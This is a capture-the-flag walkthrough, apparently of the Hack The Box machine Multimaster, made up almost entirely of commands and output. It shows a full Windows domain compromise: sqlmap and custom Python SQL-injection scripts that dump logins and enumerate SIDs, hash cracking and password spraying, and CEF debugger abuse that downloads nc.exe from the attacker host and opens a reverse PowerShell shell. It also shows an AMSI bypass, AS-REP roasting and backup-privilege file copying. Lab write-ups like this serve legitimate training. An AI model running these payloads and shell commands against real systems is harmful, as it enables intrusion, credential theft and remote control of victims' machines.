# Multimaster
## sqlmap
## crackmapexec
## evil-winrm
## impacket-smbserver
## impacket-GetNPUsers
``````

➜  ~ echo "10.10.10.179 multimaster.htb" | sudo tee -a /etc/hosts

➜  ~ rustscan -a multimaster.htb --ulimit 5000

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
3389/tcp  open  ms-wbt-server    syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49674/tcp open  unknown          syn-ack
49675/tcp open  unknown          syn-ack
49678/tcp open  unknown          syn-ack
49696/tcp open  unknown          syn-ack

➜  sudo nmap -Pn -sV -T4 -p- -oA Multimaster -vv multimaster.htb

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-07 17:09:04Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGACORP)
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

➜  ~ sudo ldapsearch -x -H ldap://multimaster.htb -s base namingcontexts

dn:
namingContexts: DC=MEGACORP,DC=LOCAL
namingContexts: CN=Configuration,DC=MEGACORP,DC=LOCAL
namingContexts: CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
namingContexts: DC=DomainDnsZones,DC=MEGACORP,DC=LOCAL
namingContexts: DC=ForestDnsZones,DC=MEGACORP,DC=LOCAL

➜  ~ sudo ldapsearch -x -H ldap://multimaster.htb -b 'dc=MEGACORP,dc=LOCAL'

➜  dist git:(master) ./kerbrute_linux_amd64 userenum --dc multimaster.htb  -d MEGACORP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

➜  cat kerbrute_usernames.txt 

james
andrew
dai
alice
administrator
lana
rmartin

➜  for user in $(cat kerbrute_usernames.txt); do impacket-GetNPUsers MEGACORP.LOCAL/${user} -no-pass -dc-ip multimaster.htb; done

FAIL

Go to: Burpsuite
Go to: http://multimaster.htb
Go to: http://multimaster.htb/api/getColleagues
Go to: HTTP history
Find:

/api/getColleagues

Copy to file -> ~/htb/Active_Directory_101/Multimaster/mulitmaster_request.txt

➜  history | grep sqlmap

   70  sqlmap -r multimaster_request.txt --tamper=charunicodeescape --delay 2 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080
   71  sqlmap -r multimaster_request.txt --tamper=charunicodeescape --delay 2 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080 --dbs
   72  sqlmap -r multimaster_request.txt --tamper=charunicodeescape --delay 2 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080 --dump-all --exclude-sysdbs

➜  ~ cat /home/windows_kali/.local/share/sqlmap/output/multimaster.htb/dump/Hub_DB/Logins.csv
id,password,username
1,9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739,sbauer
2,fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa,okent
3,68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813,ckane
4,68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813,kpage
5,9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739,shayna
6,9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739,james
7,9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739,cyork
8,fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa,rmartin
9,68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813,zac
10,9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739,jorden
11,fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa,alyx
12,68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813,ilee
13,fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa,nbourne
14,68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813,zpowers
15,9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739,aldom
16,cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc,minatotw
17,cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc,egre55

➜  ~ sed 's#,# #g' /home/windows_kali/.local/share/sqlmap/output/multimaster.htb/dump/Hub_DB/Logins.csv | sed 1d |awk '{ print $2 }' > hashes.txt
➜  ~ cat hashes.txt 

9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc

PS C:\Users\c0rvu5\Downloads\hashcat-6.2.5>  $hashes=(.\hashcat --example-hashes | where {$_.split('Example.Hash........: ')[-1].length -like 96})
PS C:\Users\c0rvu5\Downloads\hashcat-6.2.5> .\hashcat --example-hashes | Select-String $hashes -Context 8,1

  Hash mode #10800
  Hash mode #10870
  Hash mode #17500
  Hash mode #17900

➜  ~ history | tail -4

  135  hashcat -m 10800 hashes.txt /usr/share/wordlists/rockyou.txt
  136  hashcat -m 10870 hashes.txt /usr/share/wordlists/rockyou.txt
  137  hashcat -m 17500 hashes.txt /usr/share/wordlists/rockyou.txt
  138  hashcat -m 17900 hashes.txt /usr/share/wordlists/rockyou.txt

➜  ~ hashcat -m 17900 hashes.txt /usr/share/wordlists/rockyou.txt

9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1

➜  ~ sed 's#,# #g' /home/windows_kali/.local/share/sqlmap/output/multimaster.htb/dump/Hub_DB/Logins.csv | sed 1d |awk '{ print $3 }' > usernames.txt
➜  ~ cat usernames.txt

sbauer
okent
ckane
kpage
shayna
james
cyork
rmartin
zac
jorden
alyx
ilee
nbourne
zpowers
aldom
minatotw
egre55

vi passwords.txt
Add:

9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1

➜  ~ sed 's#:# #g' passwords.txt | awk '{ print $2 }' > pass.txt
➜  ~ cat pass.txt

password1
finance1
banking1

➜  ~ crackmapexec smb multimaster.htb -u usernames.txt -p pass.txt

FAIL

➜  vi convertInput.py
➜  chmod 700 convertInput.py
➜  bat convertInput.py
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: convertInput.py
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ import requests
   2   │ import readline
   3   │ 
   4   │ url = 'http://multimaster.htb/api/getColleagues'
   5   │ proxy = { 'http': '127.0.0.1:8080' }
   6   │ 
   7   │ query = input('~ ').strip()
   8   │ utf=[]
   9   │ for i in query:
  10   │     utf.append('\\u00'+hex(ord(i)).split('x')[1])
  11   │ 
  12   │ payload = ''.join([i for i in utf])
  13   │ 
  14   │ header = { 'Content-type': 'application/json' }
  15   │ 
  16   │ final_payload = '{"name": "' + payload + '"}'
  17   │ 
  18   │ # print(final_payload)
  19   │ 
  20   │ r = requests.post(url, data=final_payload, headers=header, proxies=proxy)
  21   │ 
  22   │ print('\n---Start---\n')
  23   │ print(r.text)
  24   │ print('\n---Done---')
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

➜  python3 convertInput.py
~ c0rvu5' UNION ALL SELECT 72,72,72,SUSER_SID('MEGACORP\Domain Admins'),72-- a

---Start---

[{"id":72,"name":"72","position":"72","email":"\u0001\u0005\u0000\u0000\u0000\u0000\u0000\u0005\u0015\u0000\u0000\u0000\u001c\u0000Ñ¼ÑñI+ßÂ6\u0000\u0002\u0000\u0000","src":"72"}]

---Done---

➜  python3 convertInput.py 
~ c0rvu5' UNION ALL SELECT 72,72,72,master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')),72-- a

---Start---

[{"id":72,"name":"72","position":"72","email":"0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000","src":"72"}]

---Done---

➜  vi getSID2.py 
➜  bat getSID2.py 
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: getSID2.py
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ import json, requests
   2   │ from time import sleep
   3   │ 
   4   │ url = 'http://multimaster.htb/api/getColleagues'
   5   │ 
   6   │ def unicode(query):
   7   │     utf = []
   8   │     for i in query:
   9   │         utf.append("\\u00"+hex(ord(i)).split('x')[1])
  10   │     return ''.join([i for i in utf])
  11   │ 
  12   │ sid = ''
  13   │ for i in range(1000,1200):
  14   │     i = hex(i)[2:].upper()
  15   │     if len(i) < 4:
  16   │         i ='0' + i
  17   │     rev = bytearray.fromhex(i)
  18   │     rev.reverse()
  19   │     rev = ''.join(format(x, '02x') for x in rev).upper() + '0' * 4
  20   │     
  21   │     sid = '0x0105000000000005150000001c00d1bcd181f1492bdfc236{}'.format(rev)
  22   │     
  23   │     payload = "c0rvu5' UNION SELECT 72,SUSER_SNAME({}),72,72,72-- a".format(sid)
  24   │     
  25   │     r = requests.post(url, data='{"name":"' + unicode(payload) + '"}', headers={'Content-type': 'Application/json'})
  26   │     user=json.loads(r.text)[0]['name']
  27   │     if user:
  28   │         print(user)
  29   │     sleep(2)
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

➜  python3 getSID2.py

MEGACORP\MULTIMASTER$
MEGACORP\DnsAdmins
MEGACORP\DnsUpdateProxy
MEGACORP\svc-nas
MEGACORP\Privileged IT Accounts
MEGACORP\tushikikatomo
MEGACORP\andrew
MEGACORP\lana

➜  vi usernames2.txt
Add:

[+] Found account [01000]  MEGACORP\MULTIMASTER$                              
[+] Found account [01101]  MEGACORP\DnsAdmins                              
[+] Found account [01102]  MEGACORP\DnsUpdateProxy                              
[+] Found account [01103]  MEGACORP\svc-nas                              
[+] Found account [01105]  MEGACORP\Privileged IT Accounts                              
[+] Found account [01110]  MEGACORP\tushikikatomo                              
[+] Found account [01111]  MEGACORP\andrew                              
[+] Found account [01112]  MEGACORP\lana 

➜  ~ sed 's#\\# #g' usernames2.txt | awk '{ print $6 }'

MULTIMASTER$
DnsAdmins
DnsUpdateProxy
svc-nas
Privileged
tushikikatomo
andrew
lana

➜  ~ sed 's#\\# #g' usernames2.txt | awk '{ print $6 }' > usernames2.txt
➜  ~ crackmapexec smb multimaster.htb -u new_users.txt -p pass.txt

SMB         multimaster.htb 445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         multimaster.htb 445    MULTIMASTER      [+] MEGACORP.LOCAL\tushikikatomo:finance1 

➜  ~ crackmapexec winrm multimaster.htb -u tushikikatomo -p finance1

SMB         multimaster.htb 5985   MULTIMASTER      [*] Windows 10.0 Build 14393 (name:MULTIMASTER) (domain:MEGACORP.LOCAL)
HTTP        multimaster.htb 5985   MULTIMASTER      [*] http://multimaster.htb:5985/wsman

➜  ~ evil-winrm -i multimaster.htb -u tushikikatomo -p finance1

*Evil-WinRM* PS C:\Users\alcibiades\Documents> get-childitem -path C:\Users -include *.txt* -File -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\alcibiades\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/8/2022  11:22 AM             34 user.txt

*Evil-WinRM* PS C:\Users\alcibiades\Documents> type C:\Users\alcibiades\Desktop\user.txt

user_flag

➜  wget https://github.com/taviso/cefdebug/releases/download/v0.2/cefdebug.zip ; unzip cefdebug.zip ; cd cefdebug
➜  sudo impacket-smbserver share . -smb2support -username hey -password hey

on target

*Evil-WinRM* PS C:\Users\alcibiades\Documents> net use \\10.10.16.4\share /u:hey hey
*Evil-WinRM* PS C:\Users\alcibiades\Documents> copy \\10.10.16.4\share\cefdebug.exe
*Evil-WinRM* PS C:\Users\alcibiades\Documents> .\cefdebug.exe

cefdebug.exe : [2022/07/08 23:31:16:0036] U: There are 4 tcp sockets in state listen.
    + CategoryInfo          : NotSpecified: ([2022/07/08 23:...n state listen.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2022/07/08 23:31:36:0503] U: There were 2 servers that appear to be CEF debuggers.
[2022/07/08 23:31:36:0503] U: ws://127.0.0.1:44909/da47910e-1155-4aaa-affa-530d64cf39b0
[2022/07/08 23:31:36:0503] U: ws://127.0.0.1:46236/9e6c940f-c1f4-4b3b-8361-825308edef92

**DISCLAIMER**
Copy the ws:// link quickly and ensure syntax is precise. It may fail regardless and you will have to rinse/repeat.

*Evil-WinRM* PS C:\Users\alcibiades\Documents> .\cefdebug.exe --url ws://127.0.0.1:46236/9e6c940f-c1f4-4b3b-8361-825308edef92 --code "process.version"

cefdebug.exe : [2022/07/08 23:33:18:7049] U: >>> process.version
    + CategoryInfo          : NotSpecified: ([2022/07/08 23:...process.version:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
[2022/07/08 23:33:18:7049] U: <<< v10.11.0

➜  ~ locate nc.exe
➜  ~ cd /usr/share/seclists/Web-Shells/FuzzDB/
➜  ~ pythom -m http.server

*Evil-WinRM* PS C:\Users\alcibiades\Documents> .\cefdebug.exe --url ws://127.0.0.1:7572/2fc9c2f4-0dd1-4a31-b3d0-39b06c36e381 --code "process.mainModule.require('child_process').exec('powershell IWR -Uri http://10.10.16.4:8000/nc.exe -Outfile C:\\windows\\temp\\nc.exe')"

*Evil-WinRM* PS C:\Users\alcibiades\Documents> menu
*Evil-WinRM* PS C:\Users\sbauer\Documents> Bypass-4MSI

Info: Patching 4MSI, please be patient...
[+] Success!

➜  ~ sudo rlwrap nc -lvnp 1234

*Evil-WinRM* PS C:\Users\alcibiades\Documents> .\cefdebug.exe --url ws://127.0.0.1:7572/2fc9c2f4-0dd1-4a31-b3d0-39b06c36e381 --code "process.mainModule.require('child_process').exec('C:\\windows\\temp\\nc.exe -e powershell.exe 10.10.16.4 1234')"

➜  sudo impacket-smbserver share . -smb2support -username hey -password hey

on target

*Evil-WinRM* PS C:\Users\alcibiades\Documents> net use \\10.10.16.4\share /u:hey hey
*Evil-WinRM* PS C:\Users\alcibiades\Documents> copy \\10.10.16.4\share\cefdebug.exe

PS C:\inetpub\wwwroot\bin> net use \\10.10.16.4\share /u:hey hey
PS C:\inetpub\wwwroot\bin> copy MultimasterAPI.dll \\10.10.16.4\share\MultimasterAPI.dll

➜  strings MultimasterAPI.dll
➜  strings -el MultimasterAPI.dll

server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;

➜  cat usernames.txt 

sbauer
okent
ckane
kpage
shayna
james
cyork
rmartin
zac
jorden
alyx
ilee
nbourne
zpowers
aldom
minatotw
egre55

➜  cat new_users.txt 

DnsAdmins
DnsUpdateProxy
svc-nas
Privileged
tushikikatomo
andrew
lana

➜  crackmapexec smb multimaster.htb -u usernames.txt new_users.txt -p D3veL0pM3nT! --continue-on-success

SMB         multimaster.htb 445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         multimaster.htb 445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3veL0pM3nT! 

sbauer:D3veL0pM3nT!

➜  crackmapexec winrm multimaster.htb -u sbauer -p D3veL0pM3nT!

SMB         multimaster.htb 5985   MULTIMASTER      [*] Windows 10.0 Build 14393 (name:MULTIMASTER) (domain:MEGACORP.LOCAL)
HTTP        multimaster.htb 5985   MULTIMASTER      [*] http://multimaster.htb:5985/wsman

➜  evil-winrm -i multimaster.htb -u sbauer -p D3veL0pM3nT!

➜  locate SharpHound.exe

/usr/share/metasploit-framework/data/post/SharpHound.exe

**DISCLAIMER**
Enumerating with bloodhound-python WORKS with the 'sudo apt install bloodhoud' version 4.1.0
vs.
Enumeration with SharpHound.exe via evil-winrm which requires a newer version of bloodhound i.e. vs. 4.3.0

*Evil-WinRM* PS C:\Users\sbauer\Documents> upload /usr/share/metasploit-framework/data/post/SharpHound.exe
*Evil-WinRM* PS C:\Users\sbauer\Documents> .\SharpHound.exe -c all
*Evil-WinRM* PS C:\Users\sbauer\Documents> download 20220709010433_BloodHound.zip /home/windows_kali/htb/20220709010433_BloodHound.zip

➜  cd ~/htb/
➜  mv 20220709010433_BloodHound.zip Active_Directory_101/Multimaster 
➜  cd ~/bin/BloodHound-linux-x64 
➜  service docker start
➜  sudo docker start neo4j-server
➜  BloodHound-linux-x64 ./BloodHound 

Type into search:

tushikiatomo

Click: 

TUSHIKIKATOMO@MEGACORP.LOCAL

Right-click 'TUSHIKIKATOMO@MEGACORP.LOCAL' icon
Select: 

'! Mark User as Owned'

Type into search:

cyork

Click: 

CYORK@MEGACORP.LOCAL

Right-click 'CYORK@MEGACORP.LOCAL' icon
Select: 

'! Mark User as Owned'

Type into search:

sbauer

Click: 

SBAUER@MEGACORP.LOCAL

Right-click 'SBAUER@MEGACORP.LOCAL' icon
Select: 

'! Mark User as Owned'

Go to: Hamburger Menu -> 'Pre-Built Analytics Queries' -> 'Shorest Paths from Domain Users to High Value Targets'

Find SBAUER@MEGACORP.LOCAL -> JORDEN@MEGACORPLOCAL -> GenericWrite -> Help

'The user SBAUER@MEGACORP.LOCAL has generic write access to the user JORDEN@MEGACORP.LOCAL.
Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user'

'A targeted kerberoast attack can be performed using PowerView’s Set-DomainObject along with Get-DomainSPNTicket.

You may need to authenticate to the Domain Controller as SBAUER@MEGACORP.LOCAL if you are not running a process as that user. To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)

Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as SBAUER@MEGACORP.LOCAL:

Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}

After running this, you can use Get-DomainSPNTicket as follows:

Get-DomainSPNTicket -Credential $Cred harmj0y | fl

The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:

Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname'

*Evil-WinRM* PS C:\Users\sbauer\Documents> Get-ADUser Jorden | Set-ADAccountControl -doesnotrequirepreauth $true

➜  ~ impacket-GetNPUsers megacorp/jorden -no-pass -dc-ip multimaster.htb

[*] Getting TGT for jorden
$krb5asrep$23$jorden@MEGACORP:b8adbcf9b87398fde522162fc2dbca7f$afc3aed9f564419b527b023dc5eb0b47c8374ef087180356d61fb33c12b5b2f7859d0e2986568772dde1a9e0dbd598d8339bc8f3242ecbf80673b24aaa9a86e3ac014981ce82f93dd4855f8a7b68d58617239388f61b69eb3e973b8664e06fad1b768f258972e1e37e2de9cf0cea47309fc0b136159cb4e7519f7eb3592f3430a4f6e20ea41b2bf1134ceeba3f82af6891b55d2b8fa8529f18c644f6340469785cdaa13118bb0f96c3aba541ff9f8b55236b06b54e4f8fb673b61d9480caea03d68e52279c87dcb7604a16dab7d5f2792255a257dc38ab152a718eaf83bb02d25c254dfc1619a429bd89

➜  impacket-GetNPUsers megacorp/jorden -no-pass -dc-ip multimaster.htb > hash.txt
➜  sed '1,3d' hash.txt > h.txt
➜  hashcat -m 18200 h.txt /usr/share/wordlists/rockyou.txt 

$krb5asrep$23$jorden@MEGACORP:e08e16b69ae7bdca9aed444072718350$84e83d2280ff23928fc08059972b8ca0c0423c1d8b8725c17732b9e4e0b177537262f55359fe9377d7bbd4c35a29aa546113bf3e3a43c083988cd0376cc4ec4f383c307199f912e4d0579dde278e87e5785242bcf0a2028eec4d4838cb2a275a3d9ff88e02e894b62c2f8e2fe5c01e49fed02261fe33a24944267cbdf8cd5f9d1f0b74c95117d222560dad395f711e3d9fd591f1998766925736f46133a8109d92174da96d2a9cc2ff106b92d4686198aa7692017d1255e96d6ab0738e7ce465b3c151365f25f7f4ec3383eec037bec2428dd4e2a8febf3526c4beca9821c5eb8f68d8acc91bbb3005f1:rainforest786

password: rainforest786

jorden:rainforest786

➜  crackmapexec winrm multimaster.htb -u jorden -p rainforest786

SMB         multimaster.htb 5985   MULTIMASTER      [*] Windows 10.0 Build 14393 (name:MULTIMASTER) (domain:MEGACORP.LOCAL)
HTTP        multimaster.htb 5985   MULTIMASTER      [*] http://multimaster.htb:5985/wsman

➜  evil-winrm -u jorden -p rainforest786 -i multimaster.htb

*Evil-WinRM* PS C:\Users\jorden\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

*Evil-WinRM* PS C:\Users\jorden\desktop> get-childitem -path C:\Users -include *.txt* -File -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/8/2022  11:25 PM             34 root.txt

    Directory: C:\Users\alcibiades\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/8/2022  11:25 PM             34 user.txt

*Evil-WinRM* PS C:\Users\jorden\Documents> cd $home\Desktop
*Evil-WinRM* PS C:\Users\jorden\desktop> robocopy /b C:\Users\alcibiades\Desktop $home\desktop\
*Evil-WinRM* PS C:\Users\jorden\desktop> robocopy /b C:\Users\Administrator\Desktop\ $home\desktop\
*Evil-WinRM* PS C:\Users\jorden\desktop> dir

    Directory: C:\Users\jorden\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         7/8/2022  11:25 PM             34 root.txt
-ar---         7/8/2022  11:25 PM             34 user.txt

*Evil-WinRM* PS C:\Users\jorden\desktop> type user.txt

user_flag

*Evil-WinRM* PS C:\Users\jorden\desktop> type root.txt

root_flag

``````

![image](https://0xc0rvu5.github.io/docs/assets/images/20220707125900.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220709060644.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220709060711.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220709060726.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708134556.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708134616.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708134851.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708135923.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708135940.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708140005.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708140156.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708140141.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708144820.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708150925.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708150859.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708150955.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708151807.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220709055759.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708151917.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708174246.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708174211.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708174404.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220708181413.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220709042241.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220709050959.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220709051639.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220709052855.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220709053338.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220709053256.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220709054030.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220709024405.png)
